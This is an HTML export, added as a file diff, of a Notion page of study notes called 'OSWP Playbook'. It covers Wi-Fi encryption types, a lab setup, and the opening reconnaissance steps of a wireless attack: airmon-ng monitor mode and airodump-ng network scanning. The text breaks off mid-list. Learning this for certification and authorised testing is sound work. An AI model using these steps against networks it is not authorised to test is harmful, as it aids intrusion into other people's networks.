@@ -1,0 +1,772 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>OSWP Playbook</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="175e0b5d-831e-800a-9373-cbae2d52d78b" class="page sans"><header><img class="page-cover-image" src="What-Is-OSWP-Everything-You-Need-to-Know.webp" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="OSWP.B_vGDtA8_Zbgxtu.svg"/></div><h1 class="page-title">OSWP Playbook</h1><p class="page-description"></p></header><div class="page-body"><p id="175e0b5d-831e-8065-b681-f8311161111a" class=""><strong>Save this </strong><mark class="highlight-yellow"><strong>link</strong></mark><strong> for future updates →</strong> <a href="https://www.notion.so/OSWP-Playbook-175e0b5d831e800a9373cbae2d52d78b?pvs=21"><img class="icon" src="OSWP.B_vGDtA8_Zbgxtu.svg"/>OSWP Playbook</a> </p><p id="17de0b5d-831e-80fd-bd4b-c4050c42fb63" class="">CRTP Notes → <a href="https://www.notion.so/CRTP-Notes-17de0b5d831e803584f5efbc896ab8a7?pvs=21"><img class="icon" src="0_rg8hS7P0GClS7JMP.png"/>CRTP Notes</a> </p><p id="175e0b5d-831e-8046-8ab6-d869de35a604" class="">Linkedin : <mark class="highlight-red"><strong><a href="https://in.linkedin.com/in/hounnagudi-ganesh-gowda-b5aba6292">Hounnagudi Ganesh Gowda</a></strong></mark></p><p id="175e0b5d-831e-8058-8b08-efab1d65050d" class="">X              : <mark class="highlight-red"><strong><a href="https://x.com/ninjatheowl?s=21">NinjaTheOwl</a></strong></mark></p><p id="175e0b5d-831e-80a6-860d-c9e65ed743cc" class="">Written and compiled by <mark class="highlight-red"><strong><span style="border-bottom:0.05em solid">Hounnagudi Ganesh</span></strong></mark></p><hr id="175e0b5d-831e-8049-80fd-ed21d1a3dad7"/><hr id="175e0b5d-831e-80c1-9d54-d2b87cd9f404"/><h2 id="175e0b5d-831e-8116-b5ec-edaf734bb975" class=""><mark class="highlight-purple"><strong>Wi-Fi Basics</strong></mark></h2><ul id="175e0b5d-831e-81a4-953f-e9dde69b0a03" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>SSID </strong></mark><strong>(</strong><mark class="highlight-yellow"><strong>Service Set Identifier</strong></mark><strong>):</strong> Name of the Wi-Fi network.</li></ul><ul id="175e0b5d-831e-815f-99ca-e9161e6f2045" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>BSSID </strong></mark><strong>(</strong><mark class="highlight-yellow"><strong>Basic Service Set Identifier</strong></mark><strong>):</strong> MAC address of the access point (AP).</li></ul><ul id="175e0b5d-831e-8199-a478-ec3ce91eca09" class="bulleted-list"><li style="list-style-type:disc"><strong>Frequency Bands:</strong><ul id="175e0b5d-831e-81f8-8870-f28b52865677" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>2.4 GHz</strong></mark><mark class="highlight-yellow">:</mark> Wider range but slower speed.</li></ul><ul id="175e0b5d-831e-81aa-a5e5-f18ac100c7d1" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>5 GHz</strong></mark>: Shorter range but faster speed.</li></ul></li></ul><ul id="175e0b5d-831e-816a-b810-d69b2c997e98" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>Encryption Protocols</strong></mark><strong>:</strong> Protect data and control access.</li></ul><hr id="175e0b5d-831e-81b2-a42c-d47f3d595e67"/><h2 id="175e0b5d-831e-81f0-9de9-cfde1a117be4" class=""><mark class="highlight-purple"><strong>Wi-Fi Security Types</strong></mark></h2><ol type="1" id="175e0b5d-831e-8180-8e7b-e5b246c32efe" class="numbered-list" start="1"><li><mark class="highlight-yellow"><strong>WEP </strong></mark><strong>(</strong><mark class="highlight-yellow"><strong>Wired Equivalent Privacy</strong></mark><strong>):</strong><ul id="175e0b5d-831e-81fc-bc97-ed09d1dcab9b" class="bulleted-list"><li style="list-style-type:disc">Oldest and weakest encryption.</li></ul><ul id="175e0b5d-831e-81e9-9773-d7c669c7ce0f" class="bulleted-list"><li style="list-style-type:disc">Uses <strong>RC4</strong> algorithm with a short key (64-bit or 128-bit).</li></ul><ul id="175e0b5d-831e-810b-946f-cb964b979ad7" class="bulleted-list"><li style="list-style-type:disc">Vulnerable to attacks due to weak <strong>Initialization Vector (IV)</strong>.</li></ul></li></ol><ol type="1" id="175e0b5d-831e-819f-9282-dd45bdb1a02d" class="numbered-list" start="2"><li><mark class="highlight-yellow"><strong>WPA-PSK </strong></mark><strong>(</strong><mark class="highlight-yellow"><strong>Wi-Fi Protected Access - Pre-Shared Key</strong></mark><strong>):</strong><ul id="175e0b5d-831e-812e-becb-e60b09ac0140" class="bulleted-list"><li style="list-style-type:disc">Replaced WEP, stronger security.</li></ul><ul id="175e0b5d-831e-81d4-9b94-f45ada89f913" class="bulleted-list"><li style="list-style-type:disc">Uses <strong>TKIP</strong> (Temporary Key Integrity Protocol) or <strong>AES</strong> for encryption.</li></ul><ul id="175e0b5d-831e-8160-848d-da62fcf94df4" class="bulleted-list"><li style="list-style-type:disc">Vulnerable to password-based attacks.</li></ul></li></ol><ol type="1" id="175e0b5d-831e-81bb-901a-e01e68e05b52" class="numbered-list" start="3"><li><mark class="highlight-yellow"><strong>WPA-Enterprise </strong></mark><strong>(</strong><mark class="highlight-yellow"><strong>MGT</strong></mark><strong>):</strong><ul id="175e0b5d-831e-8156-aba5-fb5fdf04e052" class="bulleted-list"><li style="list-style-type:disc">Designed for businesses.</li></ul><ul id="175e0b5d-831e-8158-b57a-f4726e18cf0b" class="bulleted-list"><li style="list-style-type:disc">Requires a <strong>RADIUS server</strong> for authentication.</li></ul><ul id="175e0b5d-831e-81e3-98bf-fbff3b4af295" class="bulleted-list"><li style="list-style-type:disc">Provides unique credentials for each user.</li></ul></li></ol><ol type="1" id="175e0b5d-831e-81d0-9dae-f995ac4a9b47" class="numbered-list" start="4"><li><mark class="highlight-yellow"><strong>OPN </strong></mark><strong>(</strong><mark class="highlight-yellow"><strong>Open Networks</strong></mark><strong>):</strong><ul id="175e0b5d-831e-81dc-80c5-dd0a055acf03" class="bulleted-list"><li style="list-style-type:disc">No encryption or password.</li></ul><ul id="175e0b5d-831e-81db-b704-eb94f44d5456" class="bulleted-list"><li style="list-style-type:disc">Public networks (e.g., cafes, airports) often use this.</li></ul><ul id="175e0b5d-831e-8107-aed8-fd3569053fb7" class="bulleted-list"><li style="list-style-type:disc">Highly insecure, exposing all user traffic.</li></ul><hr id="175e0b5d-831e-81c9-b65d-d54fe2556cf4"/></li></ol><h2 id="175e0b5d-831e-81a7-84a3-cbbcc06e7834" class=""><mark class="highlight-purple"><strong>Practice Environment for Students</strong></mark></h2><ol type="1" id="175e0b5d-831e-8173-8941-d1ab320d417e" class="numbered-list" start="1"><li><mark class="highlight-yellow"><strong>Virtual Machines</strong></mark><strong>:</strong><ul id="175e0b5d-831e-81d3-8226-d58a0308a98c" class="bulleted-list"><li style="list-style-type:disc">Use Kali Linux.</li></ul><ul id="175e0b5d-831e-818c-a97e-d493f8ecf77f" class="bulleted-list"><li style="list-style-type:disc">Test in a lab with isolated routers.</li></ul></li></ol><ol type="1" id="175e0b5d-831e-8139-a419-ec750362eddd" class="numbered-list" start="2"><li><mark class="highlight-yellow"><strong>Wi-Fi Adapters</strong></mark><strong>:</strong><ul id="175e0b5d-831e-8181-aab7-c6093d7e721b" class="bulleted-list"><li style="list-style-type:disc">Compatible with monitor mode and packet injection.</li></ul><ul id="175e0b5d-831e-810b-a1fa-d4eff5bdbf85" class="bulleted-list"><li style="list-style-type:disc">Examples: TP-Link TL-WN722N, Alfa AWUS036NHA.</li></ul></li></ol><hr id="175e0b5d-831e-810a-87e3-e526ea4417a7"/><h2 id="175e0b5d-831e-815e-b946-c22e695ebbd8" class=""><mark class="highlight-purple">Reconnaissance</mark></h2><p id="175e0b5d-831e-81ff-a6f8-f6b49dc6ea7e" class="">Reconnaissance is the first step in a Wi-Fi attack, where the attacker gathers information about the target network.</p><h3 id="175e0b5d-831e-8198-a0ff-d1febee32f06" class="">Goals:</h3><ol type="1" id="175e0b5d-831e-81d1-8b77-c77fbe521d83" class="numbered-list" start="1"><li>Identify nearby networks (<mark class="highlight-teal"><strong>SSID</strong></mark>, <mark class="highlight-teal"><strong>BSSID</strong></mark>, <mark class="highlight-teal"><strong>channel</strong></mark>, <mark class="highlight-teal"><strong>encryption type</strong></mark>).</li></ol><ol type="1" id="175e0b5d-831e-812e-9a61-e4d5f9facc10" class="numbered-list" start="2"><li>Discover hidden networks.</li></ol><ol type="1" id="175e0b5d-831e-8120-b325-f7f41dc680d5" class="numbered-list" start="3"><li>Monitor network activity.</li></ol><ol type="1" id="175e0b5d-831e-81b1-acb9-e3fb78a37da5" class="numbered-list" start="4"><li>Prepare the environment for further attacks.</li></ol><h2 id="175e0b5d-831e-8105-b83c-c029582c65a3" class=""><mark class="highlight-blue"><strong>1.Setup Interfaces</strong></mark></h2><h3 id="175e0b5d-831e-81bb-a52a-f250e70ba9fc" class="">Steps:</h3><ol type="1" id="175e0b5d-831e-8123-9457-e15239cc2a6d" class="numbered-list" start="1"><li><strong>List Wi-Fi Interfaces:</strong><ul id="175e0b5d-831e-810b-83cc-f1f9fde5f576" class="bulleted-list"><li style="list-style-type:disc">Command: <code>iwconfig</code></li></ul><ul id="175e0b5d-831e-81b6-a77f-dac53e74c772" class="bulleted-list"><li style="list-style-type:disc">This shows all available wireless interfaces.</li></ul></li></ol><ol type="1" id="175e0b5d-831e-810c-8da6-ec6c95eae71b" class="numbered-list" start="2"><li><strong>Enable Monitor Mode:</strong><ul id="175e0b5d-831e-8100-9dbb-c824794d1b0e" class="bulleted-list"><li style="list-style-type:disc">Monitor mode allows your Wi-Fi card to capture packets from all nearby networks.</li></ul><p id="175e0b5d-831e-815f-99dd-d0b60f9e0d45" class=""><code>airmon-ng start </code><mark class="highlight-yellow"><code><strong>wlan0</strong></code></mark></p><ul id="175e0b5d-831e-8198-8a3f-f64756bcebdb" class="bulleted-list"><li style="list-style-type:disc">Result: Creates a new interface like <code>wlan0mon</code></li></ul><ul id="175e0b5d-831e-810c-a0f6-d59d84642129" class="bulleted-list"><li style="list-style-type:disc"><strong>Check Status:</strong><ul id="175e0b5d-831e-8142-9705-d14f5a6ece0a" class="bulleted-list"><li style="list-style-type:circle">Command: <code>iwconfig wlan0mon</code></li></ul><ul id="175e0b5d-831e-819f-8e0c-ee7d6f985d30" class="bulleted-list"><li style="list-style-type:circle">Ensure the interface is in monitor mode.</li></ul></li></ul><ul id="175e0b5d-831e-818f-b3ce-f7b5df5fc2e9" class="bulleted-list"><li style="list-style-type:disc"><strong>Disable Monitor Mode:</strong><ul id="175e0b5d-831e-81f8-a358-d1d3ab84e77c" class="bulleted-list"><li style="list-style-type:circle">After usage, return to managed mode:</li></ul><p id="175e0b5d-831e-81d6-b6c2-d08c61aae767" class=""><code>airmon-ng stop </code><mark class="highlight-yellow"><code><strong>wlan0mon</strong></code></mark><mark class="highlight-yellow"><strong> </strong></mark></p></li></ul></li></ol><h2 id="175e0b5d-831e-81a3-a60b-dda4c4b5510e" class=""><mark class="highlight-blue"><strong>2. Monitor Networks</strong></mark></h2><h3 id="175e0b5d-831e-81e1-adfa-e687f3523d65" class="">Steps:</h3><ol type="1" id="175e0b5d-831e-81be-8580-cb5bf40e389d" class="numbered-list" start="1"><li><strong>Scan Nearby Networks:</strong><ul id="175e0b5d-831e-8158-8856-e4846fe079f3" class="bulleted-list"><li style="list-style-type:disc">Command: <code>airodump-ng wlan0mon</code></li></ul><ul id="175e0b5d-831e-81cc-b599-d8f0a67ccabc" class="bulleted-list"><li style="list-style-type:disc">Displays:<ul id="175e0b5d-831e-8107-9900-f19fbdb6aeb6" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>SSID</strong></mark>: Network name.</li></ul><ul id="175e0b5d-831e-81fb-a770-c6bbf5cecdc4" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>BSSID</strong></mark>: MAC address of the access point.</li></ul><ul id="175e0b5d-831e-81dc-a79a-e084a60bb181" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow"><strong>Channel</strong></mark>: Frequency channel used by the network.</li></ul><ul 